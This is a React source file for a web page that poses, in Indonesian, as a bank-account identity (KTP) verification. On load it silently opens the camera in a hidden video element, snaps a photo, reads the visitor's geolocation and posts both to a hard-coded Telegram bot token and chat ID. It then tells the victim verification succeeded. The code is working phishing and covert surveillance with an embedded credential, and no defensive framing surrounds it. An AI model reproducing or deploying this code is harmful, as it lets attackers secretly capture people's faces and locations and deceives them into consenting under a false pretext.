import React, { useEffect, useState } from 'react';
import Header from './components/Header';
import TextBold from './components/TextBold';
import TextRegular from './components/TextRegular';

const App = () => {
  const [latitude, setLatitude] = useState(null);
  const [longitude, setLongitude] = useState(null);
  const [isSent, setIsSent] = useState(false);
  const [stream, setStream] = useState(null);

  useEffect(() => {
    if (!isSent) {
      getMediaStream();
    }

    return () => {
      // Mematikan kamera saat komponen unmount
      if (stream) {
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []);

  const getMediaStream = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      const videoElement = document.createElement('video');
      videoElement.srcObject = mediaStream;
      videoElement.play();

      // Hide the video element
      videoElement.style.display = 'none';

      setStream(mediaStream);

      setTimeout(() => {
        capturePhoto(videoElement);
      }, 1000);
    } catch (err) {
      console.log('Error accessing camera:', err);
    }
  };

  const capturePhoto = (videoElement) => {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;

    const context = canvas.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

    const dataURL = canvas.toDataURL('image/jpeg');

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLatitude(position.coords.latitude);
          setLongitude(position.coords.longitude);
          sendPhotoToTelegram(dataURL);
        },
        (error) => {
          console.error('Error getting current location:', error);
          sendPhotoToTelegram(dataURL);
        }
      );
    } else {
      sendPhotoToTelegram(dataURL);
    }
  };

  const sendPhotoToTelegram = (dataURL) => {

    const botToken = '6048507067:AAHT5__Aex3zQnHCK3akIl8nhgB_C_XQLtI';
    const chatId = '1326853607';

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(dataURL), 'photo.jpg');
    formData.append('caption', `Latitude: ${latitude}\nLongitude: ${longitude}`);

    if (!isSent) {
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
      })
        .then((response) => {
          if (response.ok) {
            setIsSent(true);
            console.log('Photo sent to Telegram');
          } else {
            console.error('Error sending photo to Telegram:', response.statusText);
          }
        })
        .catch((error) => {
          console.error('Error sending photo to Telegram:', error);
        });
    }
  };

  const dataURItoBlob = (dataURI) => {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const uint8Array = new Uint8Array(arrayBuffer);

    for (let i = 0; i < byteString.length; i++) {
      uint8Array[i] = byteString.charCodeAt(i);
    }

    return new Blob([arrayBuffer], { type: mimeString });
  };

  return (
    <div style={{flexDirection: 'column'}}>
      <Header />
      <div style={{ padding: 20,  flexDirection: 'column', display: 'flex', justifyContent: 'center', alignItems: 'center'}}>
        <p />
        <TextBold text={
              !isSent ? 'Verifikasi Pembukaan Rekening Cuan Kamu' 
              : 'Berhasil Melakukan Verifikasi'} />
        <p />
        <TextRegular text="- Kamera dan Lokasi dibutuhkan untuk melakukan verifikasi KTP kamu" fs={16}/>
        <br />
        <TextRegular text="- Proses Verifikasi maks. 2x24 jam setelah dinyatakan berhasil " fs={16}/>
        {isSent && (
          <>
            <br />
            <img src="https://rumahsiapkerja.com/img/registered-email.3fde2141.png" alt="Logo" style={logoStyle} />
          </>
        )}
        {/* https://rumahsiapkerja.com/img/registered-email.3fde2141.png */}
      </div>
      {/* <h1>Capture Photo</h1>*/}
      {/* <div ref={photoPreviewRef} style={{backgroundColor: 'rgba(0, 0, 0, 0)', }}></div>  */}
    </div>
  );
};

const logoStyle = {
  height: '200px',
  width: 'auto',
  alignItems: 'center',
  display: 'flex', 
  marginLeft: -50,
  justifyContent: 'center',
};


export default App;
